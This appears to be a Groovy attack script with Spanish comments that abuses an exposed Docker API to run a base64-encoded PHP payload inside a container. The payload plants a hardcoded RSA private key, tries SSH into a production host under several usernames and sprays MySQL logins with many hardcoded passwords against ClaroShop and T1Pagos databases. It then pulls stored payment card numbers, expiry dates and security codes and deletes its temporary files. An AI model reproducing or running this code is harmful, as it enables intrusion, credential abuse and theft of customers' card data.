// Desde Docker container 5b32e909c295 (IP 172.27.141.23):
// 1. SSH a 172.27.141.24 (PROD Sears) - puerto 22 ABIERTO
// 2. MySQL 172.27.140.151:3306 (ClaroShop PROD) - puerto ABIERTO
import groovy.json.JsonOutput
import groovy.json.JsonSlurper

def dockerApi = "http://172.27.140.148:4243"
def containerId = "5b32e909c295"

def httpPost = { String urlStr, String jsonBody ->
  def conn = (HttpURLConnection) new URL(urlStr).openConnection()
  conn.setRequestMethod("POST")
  conn.setDoOutput(true)
  conn.setConnectTimeout(8000)
  conn.setReadTimeout(120000)
  conn.setRequestProperty("Content-Type", "application/json")
  if (jsonBody) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
  def code = conn.getResponseCode()
  def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
  conn.disconnect()
  return [code: code, body: body]
}

def execIn = { String cmd ->
  def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + JsonOutput.toJson(cmd) + ']}'
  def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
  if (r1.code != 201) return "EXEC_CREATE_FAIL HTTP ${r1.code}: ${r1.body}"
  def execId = new JsonSlurper().parseText(r1.body).Id
  def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
  return r2.body
}

// RSA private key (jenkins_deploy_rsa - used by all SSH publisher jobs)
def rsaKey = """-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEApeSSUiBjXCxjR9bWb90AUJ0SbLANv030lZvUY2Bc7a4VZPXc
gfvTSAmIvMiNiEPR/+hsrUhHtDtz55JqtKzk4jBxBUUFcaIreqOmKyxv3hCEmMAu
FLPiFTdiIkDs3Wpu+6JNney6PLuxOlffhA4zuS4JpNZfZz1EeEC3AIK3zLLbSp9Y
8EFJ4oO8QAZ65n4dS/f/G+U/qckJjv9pCB/c64hun3h4Ilw34Bx24q4jOTTy1HHz
AzWEGhjBLZqaNf+mxDTulXy3LCi5esPE4ILjoXFHrPD2t9hF1h6JqRUjNbsP+AMt
mFUyShPBoWEy/t/8Z4CislFQHtRyMIScbo4QywIBIwKCAQEAoScvDfOTuKAl7gPm
QMgO7zl/nMhH3mj8OZAQJgXWnb8NeATHlDZ1eS3VSazhQosGg5FToQRi6ZjW/jZ2
SRz7meXqImBObmMFqlXUnvf3pIUTGAslczJmmERt9WOkRM3K5dDdr1r+Dxy6yvZG
2A3L2HXde45rTljGK6yUhCc2NI7sr9UFoTMZ6Tzjrk8OhWdLUxDtQVwwpacDwahW
XbaV5B+vnqS2MTBJ61jZpCVRl504NFO2rg2O1Lg3E8CgzLDY7A159gAG5xKaiVM3
6JUBp377x0OJNhCunPI0q/UoyGvf5VJwjoLflTbZqrQl2FpNA7FFiLa9eJqsWYJV
8LNliwKBgQDUc0bi+0M3ByuMFqRgCAIr7mv6KTA5kF08cVQNIzL5bAO3n+ejIKRf
RFBmjKUGAuz6v4FgE8pX892IUSt/fOzd/g4Z4nYuntmOSHmsStwWyNhfobbR0c9O
bJnxjtCFI1mjBDSkJYVZ0MQvQ9sgDIvAH4sVq3sWgDtdILPPI5opSwKBgQDH5htK
g8Hwp3tj5uOL677JePqYPnvE9m0NA34SC/w6I75zJ4zsR42qof+ow6Z2ZYB6dal1
AALc4dfxGuyTT8YltQnmNcpFNgdP4Skiy+A8FZYwJ4OuPXBDqdaPDuZdgEy7LWMV
lNCnBVrfeRfr/QZWac4fzOzvC9u9/vfPLYaGgQKBgQDOYVrN3iQJke/J6hwFhB9d
4EuijmlcfZxmmfng4F1nUvxL+mv9jWx5zVVq7wa1Ye2F3prvnjJGz6QAw+Ecwn+z
FA2yvrvyxjJs9fKKHNXM/Z790EsyOYeOAxkzzJAMTjnRjw6Q0/3iOIQQqFE1E4Bx
fbpPkKN08ZjA3fCAE/TXpwKBgQDCL/1BEkdezpUfOBA+x8CmdYW4dzZnkEytjl02
GkV6TpvAUk5h3xvnlg5MK8ZHIMXzTbqO6hFo22QOybKduzWDty4wFv8BZ69U6Vsp
HdKDgq8ndtewk3Re/MHMzKVE4wi11FGf76Yel3zZFoxEVOGVxd4thT3vh9zHMjKO
voKuiwKBgFZ4LHsqhnU/o7DBdV6FB67pWtrVCZNGNf30Swd9PFzGJbSCXRKJ9Iwd
jYqClYgkyxylo5H6Nzl0Y7wGqKoGBWMIOvpkG0mrSOYMB0iGwXnWS1g94xeRw32k
CtOrnvIVC8SKdmm5H+uzoN+WpSwC+oRkS7cIGjzthuw7omygk1ng
-----END RSA PRIVATE KEY-----"""

def keyB64 = rsaKey.getBytes("UTF-8").encodeBase64().toString()

// Script: SSH to 172.27.141.24 from container, then execute local mysql commands
def phpSshScript = '''<?php
// Write SSH key
$key = base64_decode("''' + keyB64 + '''");
file_put_contents("/tmp/_k", $key);
chmod("/tmp/_k", 0600);

// 1. Try SSH to 172.27.141.24 with jenkins key
echo "=== SSH PROBE 172.27.141.24 ===\\n";
$users = ["jenkins", "root", "deployer", "sears", "ec2-user", "ubuntu"];
foreach ($users as $u) {
  $cmd = "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes -i /tmp/_k $u@172.27.141.24 'id && hostname && cat /etc/hostname && mysql -u root -e \"SHOW DATABASES\" 2>/dev/null || mysql --port 3308 -u dbcronproductos -p\"0c1A0ZW0Kh#wjqdRHVb63A\" -e \"SHOW DATABASES\"' 2>&1";
  $out = shell_exec($cmd);
  if ($out && !str_contains($out, "Permission denied") && !str_contains($out, "refused")) {
    echo "SSH_OK user=$u:\\n$out\\n";
    break;
  } else {
    echo "SSH_FAIL $u: " . substr($out, 0, 100) . "\\n";
  }
}

// 2. Also try MySQL at 172.27.140.151 (ClaroShop PROD - port OPEN)
echo "\\n=== MySQL 172.27.140.151:3306 (ClaroShop PROD) ===\\n";
$creds_cs = [
  ["appmsclient",       "d9FNoft#NSaEZgvt"],
  ["dbapipedidoscsb",   "YF8v{%dvupN3V1%T"],
  ["dbclaroapilandinga","ApLik\$r92_GF73.y"],
  ["croncsasigdig",     "5er6_dY65aSgf/s2"],
  ["root",              "JenkisLegasy25"],
  ["root",              "auroraboreal00"],
  ["root",              ""],
];
foreach ($creds_cs as [$u, $pw]) {
  $c = @new mysqli("172.27.140.151", $u, $pw, "", 3306);
  if (!$c->connect_error) {
    echo "AUTH_OK $u@172.27.140.151\\n";
    echo "GRANTS: "; $r=$c->query("SHOW GRANTS FOR CURRENT_USER()"); if($r) while($row=$r->fetch_row()) echo $row[0]."\\n";
    echo "DATABASES:\\n"; $r=$c->query("SHOW DATABASES"); if($r) while($row=$r->fetch_row()) echo $row[0]."\\n";
    $r=$c->query("SELECT COUNT(*) as cnt FROM tienda.pedidos"); if($r) echo "COUNT pedidos: ".$r->fetch_row()[0]."\\n";
    $r=$c->query("SELECT COUNT(*) as cnt FROM tienda.clientes"); if($r) echo "COUNT clientes: ".$r->fetch_row()[0]."\\n";
    $r=$c->query("SELECT Id,Cliente,Fecha_Inicio,tipotarjeta,nombre,numero,mes,ao,seguridad,total FROM tienda.pedidos WHERE numero IS NOT NULL AND numero!=\\'\\'  LIMIT 5"); 
    if($r && $r->num_rows>0){echo "PEDIDOS_CARD:\\n"; while($row=$r->fetch_assoc()) echo json_encode($row)."\\n";}
    $c->close();
    break;
  } else {
    echo "FAIL $u@172.27.140.151: ".substr($c->connect_error,0,80)."\\n";
  }
}

// 3. Try T1Pagos 172.27.141.4:3306 from container (root@.23 failed, try other users)
echo "\\n=== MySQL 172.27.141.4:3306 (T1Pagos via container) ===\\n";
$creds_t1 = [
  ["app_t1",  "wUt22Us2CUh#+M="],
  ["app_t1",  "jpTSf99UzLxC#t>"],
  ["app_t1",  "pySY8}7>ftpPz9S"],
  ["root",    ""],
  ["adaxxidb","JTQ6PrkecY3y1kVN"],
];
foreach ($creds_t1 as [$u, $pw]) {
  $c = @new mysqli("172.27.141.4", $u, $pw, "", 3306);
  if (!$c->connect_error) {
    echo "AUTH_OK $u@172.27.141.4:3306\\n";
    $r=$c->query("SHOW GRANTS FOR CURRENT_USER()"); if($r) while($row=$r->fetch_row()) echo "GRANT: ".$row[0]."\\n";
    $r=$c->query("SHOW DATABASES"); if($r) while($row=$r->fetch_row()) echo "DB: ".$row[0]."\\n";
    $c->close(); break;
  } else {
    echo "FAIL $u: ".substr($c->connect_error,0,80)."\\n";
  }
}

unlink("/tmp/_k");
echo "\\n=== DONE ===\\n";
?>'''

def phpB64 = phpSshScript.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo '${phpB64}' | base64 -d > /tmp/_ps.php && php /tmp/_ps.php 2>&1; rm -f /tmp/_ps.php"

println "=== CONTAINER EXEC: SSH TO PROD SEARS + CLAROSHOP PROD MYSQL ==="
println execIn(cmd)
println "=== FIN DOCKER SSH PROD ==="
